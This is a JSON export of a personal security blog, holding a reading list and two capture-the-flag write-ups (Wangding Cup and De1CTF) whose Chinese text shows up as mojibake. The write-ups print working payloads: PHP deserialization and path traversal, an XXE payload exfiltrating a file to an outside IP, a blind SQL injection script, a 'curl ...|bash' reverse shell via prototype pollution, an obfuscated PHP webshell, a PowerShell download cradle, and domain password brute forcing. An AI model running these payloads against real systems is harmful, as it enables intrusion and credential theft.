{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"https://glotozz.github.io","root":"/"},"pages":[{"title":"å…³äºæˆ‘","date":"2019-09-04T14:16:42.000Z","updated":"2020-03-27T14:47:15.898Z","comments":true,"path":"about/index.html","permalink":"https://glotozz.github.io/about/index.html","excerpt":"","text":"dota2ä¸“ä¸šä¸­å•ï¼Œnepnepåˆ’æ°´webæ‰‹"},{"title":"æ–‡ç« æ”¶é›†","date":"2019-09-04T14:16:42.000Z","updated":"2020-04-17T11:25:25.355Z","comments":true,"path":"read/index.html","permalink":"https://glotozz.github.io/read/index.html","excerpt":"","text":"4/17 æµ…è°ˆFastjson RCEæ¼æ´çš„ç»•è¿‡å² jenkins 2.101 XStream rce æŒ–æ˜æ€è·¯ Jenkinsä¹‹Javaååºåˆ—åŒ–æ¼æ´åˆ†æï¼ˆCVE-2016-0792ï¼‰ DefineClassåœ¨Javaååºåˆ—åŒ–å½“ä¸­çš„åˆ©ç”¨ 4/12 21å±Šåº”å±Šå®‰å…¨å­¦ç”Ÿæœ€å€¼å¾—å­¦ä¹ çš„Githubé¡¹ç›® 4/9 PHP7.0-PHP7.3æ–°ç‰¹æ€§å’Œå˜æ›´æ±‡æ€» 4/3 Time_Based_RCE é«˜çº§sqlæ³¨å…¥ 4/2 HTTPå‚æ•°ä¼ é€’ç±»å‹å·®å¼‚äº§ç”Ÿçš„æ”»å‡»é¢ é”™è¯¯ä½¿ç”¨TPä¸Šä¼ ç±»å¯¼è‡´getshell ä¸€æ¬¡â€œSSRFâ€“&gt;RCEâ€çš„è‰°éš¾åˆ©ç”¨ 4/1 é«˜æ•ˆæ¼æ´æŒ–æ˜ä¹‹Fuzzingçš„è‰ºæœ¯ æ‹¿WordPresså¼€åˆ€â€”â€”ç‚¹äº®ä»£ç å®¡è®¡æŠ€èƒ½æ ‘ï¼ˆä¸€ï¼‰ 3/29 ä»£ç å®¡è®¡å…¥é—¨ä¹‹ç”¨å‹ç•…æ·é€šT+ä»£ç å®¡è®¡ 3/26 RIPS 2017 PHPä»£ç å®‰å…¨å®¡è®¡æŒ‘æˆ˜ 3/25 ååºåˆ—åŒ–ä¹‹PHPåŸç”Ÿç±»çš„åˆ©ç”¨ 3/20 GitHub æœç´¢éªšæŠ€å·§ è®°ä¸€æ¬¡Redis+Getshellç»éªŒåˆ†äº« shodanè‡ªåŠ¨åŒ–åˆ©ç”¨ 3/19 ç”¨Powershellæ¡†æ¶Empireè¿›è¡Œå†…ç½‘åŸŸæ¸—é€(ä¸€) 3/18 30ä¸ªæœ‰å…³Pythonçš„å°æŠ€å·§ metasploitç»­ å†…ç½‘æ¸—é€ 3/17 Msfvenomå­¦ä¹ æ€»ç»“ Payloadå®ç°åˆ†ç¦»å…æ€ 3/16 requests.get()å‚æ•° Linux åå¼¹shellï¼ˆäºŒï¼‰åå¼¹shellçš„æœ¬è´¨ 3/15 å®æˆ˜ï¼šçˆ¬å–ç½‘æ˜“äº‘éŸ³ä¹æ­Œæ›²å¯¹åº”idå¹¶å‰”é™¤æ— ç‰ˆæƒæ­Œæ›² 3/14 [å°å¯†åœˆ]ç»å…¸å†™é…ç½®æ¼æ´ä¸å‡ ç§å˜å½¢å­¦ä¹  shellcodeåŠ è½½æ€»ç»“ åæ¸—é€ä¹‹meterpreterä½¿ç”¨æ”»ç•¥ 3/13 Linuxä¸‹çš„æƒé™ç»´æŒ 3/12 ç‰¹æ®Šæƒé™ SUIDã€SGIDã€Sticky æˆ‘æ‰€äº†è§£çš„æ¸—é€æµ‹è¯•â€”â€”Linuxåé—¨ç±»å‹ 3/11 Linuxç»ˆææ¸—é€æµ‹è¯•å‘½ä»¤æ€»ç»“ï¼ˆæ”¶è—å¤‡ç”¨ï¼‰ Linuxä¸‹å¸¸è§çš„æƒé™ç»´æŒæ–¹å¼ phpinfoä¸­å€¼å¾—æ³¨æ„çš„ä¿¡æ¯ ssiæ³¨å…¥æ¼æ´ 3/10 SSRFæ¼æ´(åŸç†&amp;ç»•è¿‡å§¿åŠ¿) ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£æ¼æ´ä¹‹ XXE æ¼æ´ OSæ³¨å…¥æŒ‡åŒ— 3/5 å¸¸è§Webæºç æ³„éœ²æ€»ç»“ PHPçš„å‡ ç§è¿è¡Œæ–¹å¼ Apacheä¸­.htaccessæ–‡ä»¶åˆ©ç”¨çš„æ€»ç»“ä¸æ–°æ€è·¯æ‹“å±• 3/4 .htaccessè¯¦è§£åŠ.htaccesså‚æ•°è¯´æ˜ è§£ææ¼æ´æ€»ç»“ æµ…æç™½ç›’å®¡è®¡ä¸­çš„å­—ç¬¦ç¼–ç åŠSQLæ³¨å…¥ 3/3 strtus2é‚£äº›äº‹ Struts2è‘—åRCEæ¼æ´å¼•å‘çš„åå¹´ä¹‹æ€ Xsså°æ¸¸æˆé€šå…³ç§˜ç± 3/2 æ·±å…¥äº†è§£åºåˆ—åŒ–writeObjectã€readObjectã€readResolve 3/1 Fastjsonååºåˆ—åŒ–æ¼æ´åˆ©ç”¨åˆ†æ fastjson è¿œç¨‹ååºåˆ—åŒ–pocçš„æ„é€ å’Œåˆ†æ 2/29 Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°æ·±å…¥ Spring framework deserialization RCEæ¼æ´åˆ†æä»¥åŠåˆ©ç”¨ Jndiæ³¨å…¥åŠSpring RCEæ¼æ´åˆ†æ 2/28 ä»é›¶å¼€å§‹javaä»£ç å®¡è®¡ç³»åˆ—(ä¸€) Javaä»£ç å®¡è®¡å…¥é—¨ç¯‡ï¼šWebGoat 8 2/27 SVG XSSçš„ä¸€ä¸ªé»‘é­”æ³• æ·±å…¥ç†è§£æµè§ˆå™¨è§£ææœºåˆ¶å’ŒXSSå‘é‡ç¼–ç  CSPç­–ç•¥åŠç»•è¿‡æ–¹æ³• 2020å¹´ä»ç„¶æœ‰æ•ˆçš„ä¸€äº›XSS Payload 2/26 LD_PRELOAD+putenv bypass è·¨åŸŸæ–¹å¼åŠå…¶äº§ç”Ÿçš„å®‰å…¨é—®é¢˜ Python3ç¼–ç é—®é¢˜ CRLFæ³¨å…¥æ¼æ´"}],"posts":[{"title":"ç½‘é¼æ¯-wp","slug":"ç½‘é¼æ¯-wp","date":"2020-05-10T08:29:10.000Z","updated":"2020-05-10T23:05:01.247Z","comments":true,"path":"2020/05/10/ç½‘é¼æ¯-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• web1 web2 web3 web4 æˆ‘åˆèººèººäº†ï¼Œ22å web1é™åˆ¶äº†32&lt;=ascii&lt;=125ï¼Œä¸ªäººæµ‹è¯•php7.2åŠä»¥ä¸Šå¯ä»¥å°†å±æ€§ç±»å‹ä¿®æ”¹ä¸ºpublic è¯»å–flag.phpå¤±è´¥ï¼ŒåŸå› æ˜¯æŠ˜æ„å‡½æ•°ä¸­çš„cwdä¸ºæ ¹ç›®å½•/ï¼Œä¹‹å‰[D3CTF 2019]EzUploadé‡åˆ°è¿‡ï¼Œå› æ­¤éœ€è¦ç»å¯¹è·¯å¾„ã€‚ å…ˆçˆ†ç ´è¯»å–é…ç½®æ–‡ä»¶å¾—åˆ°webç›®å½•ï¼Œå†è¯»flagå³å¯ 1&#x2F;etc&#x2F;apache2&#x2F;httpd.conf çœ‹äº†Y1ngå¸ˆå‚…çš„wpæ˜¯å…ˆåˆ©ç”¨cmdlineè¯»å–é…ç½®æ–‡ä»¶çš„è·¯å¾„ 1&#x2F;proc&#x2F;self&#x2F;cmdline 123456789101112131415&lt;?phpclass FileHandler &#123; public $op; public $filename; function __construct() &#123; //å¼±ç±»å‹ $this-&gt;op = 2; $this-&gt;filename = \"/etc/apache2/httpd.conf\"; $this-&gt;filename = \"/web/html/flag.php\"; &#125;&#125;$a = new FileHandler();echo urlencode(serialize($a)); æˆ–è€…ç¾¤é‡Œçœ‹åˆ°å¯ä»¥åˆ©ç”¨misformattedï¼ˆåˆ å»æœ€åçš„å¤§æ‹¬å·ï¼‰ï¼Œç›¸å¯¹è·¯å¾„è¯»ã€‚æµ‹äº†ä¸‹å¯è¡Œï¼ŒåŸç†å¾—çœ‹æºç  ç»è¿‡æµ‹è¯•ï¼Œä¹Ÿæ˜¯php7.2åŠä»¥ä¸Š è¿˜æœ‰ç§æ–¹æ³•ï¼Œåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ—¶å€™å¯ä»¥å¯¹è½¬ä¹‰å­—ç¬¦è¿›è¡Œå¤„ç† Bypass ecshop3.x WAF-ecshop 2.x/3.xæ— é™åˆ¶getshell æ¼æ´åˆ†æ 12345678910111213141516171819202122232425262728293031323334&lt;?phpclass FileHandler &#123; protected $op; protected $filename; protected $content; function __construct() &#123; $this-&gt;op = 2; $this-&gt;filename = \"/etc/apache2/httpd.conf\"; &#125;&#125;$a = new FileHandler();$b = urlencode(serialize($a));echo $b.\"\\n\";$b = str_replace('%00','\\00',$b);$b = str_replace('%2A','\\2A',$b);$b = urldecode($b);echo $b.\"\\n\";$b = 'O:11:\"FileHandler\":3:&#123;S:5:\"\\00\\2A\\00op\";i:2;S:11:\"\\00\\2A\\00filename\";s:23:\"/etc/apache2/httpd.conf\";S:10:\"\\00\\2A\\00content\";N;&#125;'; //éœ€è¦æ‰‹åŠ¨å°†ç§æœ‰å±æ€§å¯¹åº”çš„sæ”¹æˆå¤§å†™function is_valid($s) &#123; for($i = 0; $i &lt; strlen($s); $i++) if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125)) return false; return true;&#125;if(is_valid($b))&#123; echo \"ok\"; var_dump(unserialize($b));&#125;else&#123; echo \"sorry\";&#125; web2è¯»å– 12345678&#x2F;file_in_java&#x2F;DownloadServlet?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;web.xml..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;ListFileServlet.class..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;UploadServlet.class..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;file_in_java&#x2F;WEB-INF&#x2F;classes&#x2F;cn&#x2F;abc&#x2F;servlet&#x2F;DownloadServlet.class å‘ç°èƒ½ä¸Šä¼ jspï¼Œå¾—åˆ°äº†ä¸Šä¼ è·¯å¾„WEB-INF/uploadï¼Œä½†æ˜¯è®¿é—®shellåœ°å€ä»ç„¶404 å®¡è®¡UploadServletå¯ç–‘ https://xz.aliyun.com/t/6996 xxeç›²æ³¨ [Content_Types].xml 123456&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM \"http://118.178.88.46:1234/test.dtd\"&gt;%remote;%int;%send;]&gt;&lt;Types xmlns=\"http://schemas.openxmlformats.org/package/2006/content-types\"&gt;&lt;Default Extension=\"rels\" ContentType=\"application/vnd.openxmlformats-package.relationships+xml\"/&gt;&lt;Default Extension=\"xml\" ContentType=\"application/xml\"/&gt;&lt;Override PartName=\"/xl/workbook.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml\"/&gt;&lt;Override PartName=\"/xl/worksheets/sheet1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml\"/&gt;&lt;Override PartName=\"/xl/theme/theme1.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.theme+xml\"/&gt;&lt;Override PartName=\"/xl/styles.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.spreadsheetml.styles+xml\"/&gt;&lt;Override PartName=\"/docProps/core.xml\" ContentType=\"application/vnd.openxmlformats-package.core-properties+xml\"/&gt;&lt;Override PartName=\"/docProps/app.xml\" ContentType=\"application/vnd.openxmlformats-officedocument.extended-properties+xml\"/&gt;&lt;/Types&gt; test.dtd 12&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;118.178.88.46:1235?p&#x3D;%file;&#39;&gt;&quot;&gt; web3æµ‹è¯•å‘ç°æ˜¯insert intoæ³¨å…¥ï¼Œä½†æ˜¯æ’å…¥20è¡Œä»¥ä¸Šæç¤ºError æ‰€ä»¥æ˜¯insert intoæ³¨å…¥+æ—¶é—´ç›²æ³¨ï¼ˆæ²¡å›æ˜¾ï¼‰+æŠ¥é”™ï¼ˆé˜²æ­¢æ’å…¥æ•°æ®ï¼‰ information_schemaè¢«è¿‡æ»¤ï¼ŒçŒœä¸ªè¡¨åflag+æ— åˆ—åæ³¨å…¥ pythonè„šæœ¬ 123456789101112131415161718192021222324252627282930#!/usr/bin/env python2# coding=utf-8import requestsimport urllibs = requests.session()url = \"http://4adb1115aff04e1ca02ead7c61cc6246205fd9409286474e.changame.ichunqiu.com/register_do.php\"flag = \"\"tmp = 0for i in range(1, 100): if tmp == 1: break tmp = 1 for j in range(33, 127): param = \"2'^if(ascii(substr((select `2` from (select 1,2 union select * from flag)a limit 1,1),&#123;&#125;,1))=&#123;&#125;,pow(999,999) or sleep(3),pow(999,999)),'1')#\".format(str(i), str(j)) data = &#123; 'username': param, 'password': 'bb' &#125; try: r = requests.post(url=url, data=data, timeout=3) # print(r.content.decode('utf-8')) except requests.exceptions.ReadTimeout as e: flag += chr(j) tmp = 0 print flag breakprint(flag) web4æ¯”èµ›æ—¶æ²¡æå‡ºæ¥ CVE-2019-10795 undefsafeæ˜¯ä¸€æ¬¾æ”¯æŒè®¾ç½®å€¼çš„å‡½æ•°ã€‚ undefsafe 2.0.3ä¹‹å‰ç‰ˆæœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ã€‚æ”»å‡»è€…å¯å€ŸåŠ©aå‡½æ•°åˆ©ç”¨è¯¥æ¼æ´æ·»åŠ æˆ–ä¿®æ”¹Object.prototypeå±æ€§ã€‚ https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940 javascriptåŸå‹é“¾æ±¡æŸ“ï¼Œæ–¹æ³•å¯èƒ½ä¸å”¯ä¸€ï¼Œä¸‹é¢çš„æ¯”è¾ƒæ˜æ˜¾ æ±¡æŸ“ç‚¹/edit_note 123456789let id = req.body.id;let author = req.body.author;let enote = req.body.raw;notes.edit_note(id, author, enote);edit_note(id, author, raw) &#123; undefsafe(this.note_list, id + '.author', author); undefsafe(this.note_list, id + '.raw_note', raw);&#125; è§¦å‘ç‚¹/statusï¼Œè™½ç„¶è¿™é‡Œçœ‹çš„ä¸æ˜¯å¾ˆæ‡‚ï¼Œexecè°ƒç”¨/bin/bashï¼ŒçŸ¥é“commandsæ˜¯{}ç±»å‹çš„è°ƒç”¨ï¼Œå‰é¢å·²ç»å°†å±æ€§å¤åˆ¶åˆ°objectä¸­ 123456789101112for (let index in commands) &#123; let commands = &#123; \"script-1\": \"uptime\", \"script-2\": \"free -m\" &#125;; exec(commands[index], &#123;shell:'/bin/bash'&#125;, (err, stdout, stderr) =&gt; &#123; if (err) &#123; return; &#125; console.log(`stdout: $&#123;stdout&#125;`); &#125;);&#125; å‚è€ƒä¾‹å­ 1234var a = require(\"undefsafe\");var payload = \"__proto__.toString\";a(&#123;&#125;,payload,\"JHU\");console.log(&#123;&#125;.toString); POSTè®¿é—®/edit_noteä¼  1id&#x3D;__proto__.hahhah&amp;author&#x3D;curl http:&#x2F;&#x2F;118.178.88.46:1235&#x2F;rev.txt|bash&amp;raw&#x3D;aa è¿”å›500æ²¡å…³ç³»ï¼Œå†GETè®¿é—®/status æˆåŠŸåå¼¹shell","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"https://glotozz.github.io/tags/wp/"}]},{"title":"De1CTF-wp","slug":"De1CTF-wp","date":"2020-05-03T12:09:56.000Z","updated":"2020-05-10T16:04:14.743Z","comments":true,"path":"2020/05/03/De1CTF-wp/","link":"","permalink":"https://glotozz.github.io/2020/05/03/De1CTF-wp/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• check in mixture Hard_Pentest_1 Calc bypass the cloud WAF check in1perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet in contents! X-Powered-By: PHP/5.4.16 12AddType application&#x2F;x-httpd-p\\hp .jpg åˆ©ç”¨æ¢è¡Œç»•è¿‡ï¼Œè¿™ä¸ªå§¿åŠ¿å…¶å®ä»¥å‰ç”¨è¿‡ï¼Œä¸€å¼€å§‹æ²¡æƒ³èµ·æ¥ã€‚ã€‚ é¢„æœŸè§£æ˜¯åˆ©ç”¨ä¸Šä¼ .htaccesså¯ç”¨cgi .htaccess 12Options +ExecCGISetHandler cgi-script solve.sh 12345#!&#x2F;bin&#x2F;bashecho &quot;Content-Type: text&#x2F;plain&quot;echo &quot;&quot;cat &#x2F;flagexit 0 mixture1and case when(FIELD(substr((&#123;&#125;),&#123;&#125;,1),&#39;&#123;&#125;&#39;)&#x3D;1)then(benchmark(100000,sha1(sha(sha(1)))))end; ä¹‹åçœ‹äº†æºç  1234567891011121314151617181920&lt;?phpinclude \"profile.php\";include \"config.php\";$orderby = $_GET['orderby'];if(!empty($orderby))&#123; $blacklist = \"/if|desc|sleep|rand|updatexml|\\^|union|\\|\\||&amp;&amp;|regexp|exp|extractvalue|length|hex/i\"; if(preg_match($blacklist, $orderby)) exit(\"No~~hacker!\"); $sql = \"SELECT * FROM users order by id \".$orderby; $result = $mysqli-&gt;query($sql); if($result===false)&#123; $sql=\"SELECT * FROM users\"; &#125;&#125;else&#123; $sql = \"SELECT * FROM users\";&#125;$result = $mysqli-&gt;query($sql);?&gt; ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯ 1SELECT * FROM users order by id &quot;$orderby&quot; æµ‹è¯•å‘ç°ä¸æ˜¯ï¼Œæœ€ååªèƒ½æ˜¯SELECT * FROM users order by id $orderby è¿˜è¿‡æ»¤äº†descï¼Œå°±ä¸å¤ªæ˜ç™½è¿™æ ·çš„æŸ¥è¯¢è¯­å¥æ„ä¹‰æ˜¯å•¥ã€‚ã€‚ Hard_Pentest_1å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œè¿‡æ»¤ 12345if(!preg_match(&#39;&#x2F;[a-z0-9;~^&#96;&amp;|]&#x2F;is&#39;,$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match(&#39;&#x2F;\\.\\.&#x2F;&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) &#123; return true;&#125; Y1ngå¸ˆå‚…çš„æ€è·¯ 1æ‰«æäº†ä¸€ä¸‹å‘ç°é¢˜ç›®æ˜¯Windowsï¼Œæ‰€ä»¥åç¼€å°±å¥½åŠäº†ï¼Œç›´æ¥å¤§å°å†™ç»•è¿‡ï¼›getshellå°±ç”¨pç¥çš„æ— å­—æ¯æ•°å­—RCEï¼Œå¯¹äºæ²¡æœ‰åˆ†å·ï¼Œä¹Ÿå¾ˆç®€å•ï¼Œ&lt;? echo &quot;&quot; ?&gt; &lt;? echo &quot;&quot; ?&gt;è¿™æ · åˆ©ç”¨phpçš„é—­åˆæ ‡ç­¾æ¥ç»•è¿‡å³å¯ï¼Œå› ä¸ºPHPåœ¨å•è¡Œä¸­æ˜¯ä¸éœ€è¦åˆ†å·çš„ï¼›ä½†æ˜¯ç©¿ä¸Šçš„é©¬ç”¨èµ·æ¥è¿˜æ˜¯æ¯”è¾ƒå¤æ‚ï¼Œå¯ä»¥ç”¨echo &quot;&lt;?php eval(&#39;aaa&#39;); ?&gt;&quot; &gt;y1ng.phpæ¥ä¼ ä¸ªshellï¼Œå·²ç»ä¼ å¥½äº†ï¼š æ³¨æ„ä¸‹é¢ä¸¤ç‚¹ï¼š evalæ— æ³•ä½œä¸ºå˜é‡åŠ¨æ€æ‰§è¡Œ php7.1ä»¥åassertä¸èƒ½ç”¨ï¼Œassert() with string argument dynamically 1234567&lt;?&#x3D;$_&#x3D;[]?&gt;&lt;?&#x3D;$_&#x3D;@&quot;$_&quot;?&gt;&lt;?&#x3D;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;]?&gt;&lt;?&#x3D;$___&#x3D;$_?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$___.&#x3D;$__?&gt;&lt;?&#x3D;$____&#x3D;&#39;_&#39;?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$__&#x3D;$_?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$__++?&gt;&lt;?&#x3D;$____.&#x3D;$__?&gt;&lt;?&#x3D;$_&#x3D;$$____?&gt;&lt;?&#x3D;$_[__]($_[_])?&gt;&#x3D;&gt;$_POST[__]($_POST[_])&#x3D;&gt;__&#x3D;system&amp;_&#x3D;dir__&#x3D;system&amp;_&#x3D;echo &quot;&lt;?php eval($_POST[a]); ?&gt;&quot; &gt; a.php wuzimu.php_ ==============msf è¿™é‡Œç”Ÿæˆçš„æ—¶å€™x64æ³¨æ„ä¸èƒ½é€‰æ‹©64ä½ï¼Œ64ä¼šå¤±è´¥ åŸŸä¿¡æ¯æ”¶é›† 123net user &#x2F;domainipconfig &#x2F;all... 1net view \\\\192.168.0.12 å¾—åˆ°å‹ç¼©åŒ… å› ä¸ºæƒé™è¾ƒä½ï¼Œå¸¸è§„çš„æå–å¯†ç å·¥å…·éƒ½è·å–å¤±è´¥ï¼Œä½¿ç”¨getgpppassword 1shell powershell.exe -nop -c &quot;IEX ((new-Object net.webclient).downloadString(&#39;http:&#x2F;&#x2F;118.178.88.46:1237&#x2F;Get-GPPPassword.ps1&#39;));Get-GPPPassword -Server De1CTF2020.lab&quot; æˆ–è€…ä½¿ç”¨msfçš„gppæ¨¡å— 1msf &gt; use post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;gpp æç¤º 1234Get flag2 Hint: hint1: You need De1ta user to get flag2 hint2: De1ta user&#39;s password length is 1-8, and the password is composed of [0-9a-f]. hint3: Pay attention to the extended rights of De1ta user on the domain. hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt) ç¬¬äºŒå…³ç”Ÿæˆç¬¦åˆè¦æ±‚çš„å¯†ç  1234root@kali:~&#x2F;Desktop&#x2F;crunch# crunch 1 8 0123456789abcdef -o pass.txtCrunch will now generate the following amount of data: 40926266144 bytes39030 MB38 GB ä½¿ç”¨smb_loginæ¨¡å—çˆ†ç ´ å…ˆä»£ç†è½¬å‘csçš„socks4+proxychains 123456use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_loginset rhosts 192.168.0.11set user_file &#x2F;root&#x2F;Desktop&#x2F;crunch&#x2F;user.txtset pass_file &#x2F;root&#x2F;Desktop&#x2F;crunch&#x2F;pass.txtset stop_on_success trueexploit =================å½“ç„¶ä¸Šé¢è‚¯å®šæ˜¯çˆ†ç ´ä¸å‡ºæ¥çš„ Nu1Lçš„wp æˆ‘ä»¬è¦å»é€šè¿‡ç±»ä¼¼çˆ†ç ´çš„â¼¿æ³•è·å–De1taè´¦æˆ·çš„æƒ é™ï¼Œé€šè¿‡Kerberoastï¼Œçˆ†ç ´è·å–åˆ°å¯†ç ï¼Œç„¶åæ ¹æ®Hintè·å–äº†De1taçš„ExtendRightsï¼Œé€šè¿‡æœç´¢å‘ç° ExtenRightsç¬¦åˆDcshadowçš„åˆ©â½¤æ¡ä»¶ã€‚ 